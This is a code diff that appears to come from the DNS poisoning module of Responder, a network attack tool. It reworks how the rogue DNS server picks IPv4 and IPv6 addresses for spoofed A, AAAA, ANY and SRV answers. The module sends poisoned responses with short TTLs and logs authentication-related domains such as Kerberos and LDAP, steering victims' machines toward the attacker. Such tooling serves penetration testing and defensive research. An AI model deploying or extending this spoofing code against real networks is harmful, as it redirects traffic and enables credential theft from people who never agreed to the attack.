@@ -23,7 +23,7 @@
 # - SRV record poisoning for service discovery (Kerberos, LDAP, etc.)
 # - Logs interesting authentication-related domains
 # - Short TTL (60s) to ensure frequent re-queries
-# - IPv6 support for modern networks
+# - Proper IPv6 support (uses -6 option, auto-detects, or skips AAAA)
 # - Domain filtering to target specific domains only
 #
 from utils import *
@@ -105,8 +105,9 @@ class DNS(BaseRequestHandler):
 				socket_obj.sendto(response, self.client_address)
 				
 				target_ip = self.get_target_ip(query_type)
-				print(color('[DNS] Poisoned response: %s -> %s' % (
-					query_name, target_ip), 2, 1))
+				if target_ip:
+					print(color('[DNS] Poisoned response: %s -> %s' % (
+						query_name, target_ip), 2, 1))
 		
 		except Exception as e:
 			if settings.Config.Verbose:
@@ -262,19 +263,22 @@ class DNS(BaseRequestHandler):
 			if settings.Config.Verbose:
 				print(color('[DNS] Query matches target domain %s - responding' % target_domain, 3, 1))
 		
+		# For AAAA queries, only respond if we have a valid IPv6 address
+		# With link-local fallback, this should almost always succeed
+		# Only fails if IPv6 is completely disabled on the system
+		if query_type == 28:  # AAAA
+			ipv6 = self.get_ipv6_address()
+			if not ipv6:
+				if settings.Config.Verbose:
+					print(text('[DNS] IPv6 disabled on system, not responding to AAAA query for %s' % query_name))
+				return False
+		
 		# Respond to these query types:
 		# A (1), SOA (6), MX (15), TXT (16), AAAA (28), SRV (33), ANY (255)
 		# SVCB (64), HTTPS (65) - Service Binding records
 		supported_types = [1, 6, 15, 16, 28, 33, 64, 65, 255]
 		if query_type not in supported_types:
 			return False
-		
-		# Check if domain is in analyze mode targets
-		# DNS server should not be affected by analyze mode since its not a poisoner, but a rogue DNS server.
-		#if hasattr(settings.Config, 'AnalyzeMode'):
-			#if settings.Config.AnalyzeMode:
-				# In analyze mode, log but don't respond
-				#return False
 		
 		# Log interesting queries (authentication-related domains)
 		query_lower = query_name.lower()
@@ -342,20 +346,24 @@ class DNS(BaseRequestHandler):
 			# TTL (short to ensure frequent re-queries)
 			response += struct.pack('>I', 60)  # 60 seconds
 			
-			# Get target IP
-			target_ip = self.get_target_ip(query_type)
+			# Get target IP for A records
+			target_ipv4 = self.get_ipv4_address()
 			
 			if query_type == 1:  # A record
 				# RDLENGTH
 				response += struct.pack('>H', 4)
 				# RDATA (IPv4 address)
-				response += socket.inet_aton(target_ip)
+				response += socket.inet_aton(target_ipv4)
 			
 			elif query_type == 28:  # AAAA record
+				# Get proper IPv6 address (already validated in should_respond)
+				ipv6 = self.get_ipv6_address()
+				if not ipv6:
+					return None  # Should not happen if should_respond worked
+				
 				# RDLENGTH
 				response += struct.pack('>H', 16)
 				# RDATA (IPv6 address)
-				ipv6 = self.get_ipv6_address()
 				response += socket.inet_pton(socket.AF_INET6, ipv6)
 			
 			elif query_type == 6:  # SOA record (Start of Authority)
@@ -426,7 +434,7 @@ class DNS(BaseRequestHandler):
 			elif query_type == 255:  # ANY query
 				# Respond with A record
 				response += struct.pack('>H', 4)
-				response += socket.inet_aton(target_ip)
+				response += socket.inet_aton(target_ipv4)
 			
 			elif query_type == 64 or query_type == 65:  # SVCB (64) or HTTPS (65) record
 				# Service Binding records - respond with alias to same domain
@@ -505,55 +513,129 @@ class DNS(BaseRequestHandler):
 	
 	def get_target_ip(self, query_type):
 		"""Get the target IP address for spoofed responses"""
-		# Use Responder's configured IP
 		if query_type == 28:  # AAAA
 			return self.get_ipv6_address()
-		else:  # A record
-			return settings.Config.Bind_To
+		else:  # A record and others
+			return self.get_ipv4_address()
+	
+	def get_ipv4_address(self):
+		"""Get IPv4 address for A record responses"""
+		# Priority 1: Use ExternalIP if set (-e option)
+		if hasattr(settings.Config, 'ExternalIP') and settings.Config.ExternalIP:
+			return settings.Config.ExternalIP
+		
+		# Priority 2: Use Bind_To (default)
+		return settings.Config.Bind_To
 	
 	def get_ipv6_address(self):
-		"""Get IPv6 address for AAAA responses"""
-		# Priority 1: Use explicitly configured IPv6
-		if hasattr(settings.Config, 'Bind_To_IPv6') and settings.Config.Bind_To_IPv6:
-			return settings.Config.Bind_To_IPv6
+		"""
+		Get IPv6 address for AAAA responses
 		
-		# Priority 2: Try to detect actual IPv6 on interface
+		Returns a valid native IPv6 address.
+		
+		Priority order:
+		1. ExternalIP6 (-6 command line option)
+		2. Bind_To_IPv6 from config file
+		3. Global IPv6 on interface (auto-detected)
+		4. Link-local fe80:: on interface (fallback - always available!)
+		
+		Link-local addresses work for Responder because:
+		- Responder operates on the local network segment
+		- Clients on the same segment can reach fe80:: addresses
+		- fe80:: is always available when IPv6 is enabled
+		
+		Does NOT return IPv4-mapped addresses (::ffff:x.x.x.x).
+		"""
+		# Priority 1: Use ExternalIP6 if set (-6 command line option)
+		if hasattr(settings.Config, 'ExternalIP6') and settings.Config.ExternalIP6:
+			ipv6 = settings.Config.ExternalIP6
+			# Validate it's not an IPv4-mapped address
+			if not ipv6.startswith('::ffff:'):
+				if settings.Config.Verbose:
+					print(text('[DNS] Using ExternalIP6: %s' % ipv6))
+				return ipv6
+		
+		# Priority 2: Use Bind_To_IPv6 from config
+		if hasattr(settings.Config, 'Bind_To_IPv6') and settings.Config.Bind_To_IPv6:
+			ipv6 = settings.Config.Bind_To_IPv6
+			if not ipv6.startswith('::ffff:'):
+				return ipv6
+		
+		# Priority 3 & 4: Try to auto-detect IPv6 on the interface
+		# First pass: look for global IPv6
+		# Second pass: accept link-local fe80::
 		try:
 			import netifaces
+			
+			target_iface = None
+			
+			# Find interface from IPv4 address
 			ipv4 = settings.Config.Bind_To
 			
-			# Find which interface has this IPv4
 			for iface in netifaces.interfaces():
 				try:
 					addrs = netifaces.ifaddresses(iface)
+					
 					# Check if this interface has our IPv4
 					if netifaces.AF_INET in addrs:
 						for addr in addrs[netifaces.AF_INET]:
 							if addr.get('addr') == ipv4:
-								# Found the interface, get its global IPv6
-								if netifaces.AF_INET6 in addrs:
-									for ipv6_addr in addrs[netifaces.AF_INET6]:
-										ipv6 = ipv6_addr.get('addr', '').split('%')[0]
-										# Return first global IPv6 (not link-local fe80::)
-										if ipv6 and not ipv6.startswith('fe80:'):
-											return ipv6
+								target_iface = iface
+								break
+					if target_iface:
+						break
 				except:
 					continue
+			
+			# If no interface found via IPv4, use configured interface
+			if not target_iface and hasattr(settings.Config, 'Interface') and settings.Config.Interface:
+				target_iface = settings.Config.Interface
+			
+			if target_iface:
+				try:
+					addrs = netifaces.ifaddresses(target_iface)
+					if netifaces.AF_INET6 in addrs:
+						global_ipv6 = None
+						linklocal_ipv6 = None
+						
+						for ipv6_addr in addrs[netifaces.AF_INET6]:
+							ipv6 = ipv6_addr.get('addr', '').split('%')[0]  # Remove %interface suffix
+							
+							if not ipv6 or ipv6.startswith('::ffff:') or ipv6 == '::1':
+								continue
+							
+							if ipv6.startswith('fe80:'):
+								# Link-local - save as fallback
+								if not linklocal_ipv6:
+									linklocal_ipv6 = ipv6
+							else:
+								# Global IPv6 - preferred
+								if not global_ipv6:
+									global_ipv6 = ipv6
+						
+						# Priority 3: Return global IPv6 if available
+						if global_ipv6:
+							if settings.Config.Verbose:
+								print(text('[DNS] Using global IPv6 on %s: %s' % (target_iface, global_ipv6)))
+							return global_ipv6
+						
+						# Priority 4: Fall back to link-local
+						if linklocal_ipv6:
+							if settings.Config.Verbose:
+								print(text('[DNS] Using link-local IPv6 on %s: %s' % (target_iface, linklocal_ipv6)))
+							return linklocal_ipv6
+				except:
+					pass
+					
 		except ImportError:
-			pass
-		except:
-			pass
+			if settings.Config.Verbose:
+				print(text('[DNS] netifaces not installed - cannot auto-detect IPv6'))
+		except Exception as e:
+			if settings.Config.Verbose:
+				print(text('[DNS] Error detecting IPv6: %s' % str(e)))
 		
-		# Priority 3: Use IPv4-mapped IPv6 format (::ffff:x.x.x.x)
-		# This allows dual-stack clients to connect via IPv4
-		try:
-			ipv4 = settings.Config.Bind_To
-			return '::ffff:%s' % ipv4
-		except:
-			pass
-		
-		# Last resort: return IPv6 loopback
-		return '::1'
+		# No IPv6 found at all (IPv6 disabled on system)
+		return None
 	
 	def get_type_name(self, query_type):
 		"""Convert query type number to name"""
@@ -573,6 +655,7 @@ class DNS(BaseRequestHandler):
 			255: 'ANY'
 		}
 		return types.get(query_type, 'TYPE%d' % query_type)
+
 
 class DNSTCP(BaseRequestHandler):
 	"""
@@ -660,8 +743,9 @@ class DNSTCP(BaseRequestHandler):
 				self.request.sendall(tcp_response)
 				
 				target_ip = dns_handler.get_target_ip(query_type)
-				print(color('[DNS-TCP] Poisoned response: %s -> %s' % (
-					query_name, target_ip), 2, 1))
+				if target_ip:
+					print(color('[DNS-TCP] Poisoned response: %s -> %s' % (
+						query_name, target_ip), 2, 1))
 		
 		except Exception as e:
 			if settings.Config.Verbose:
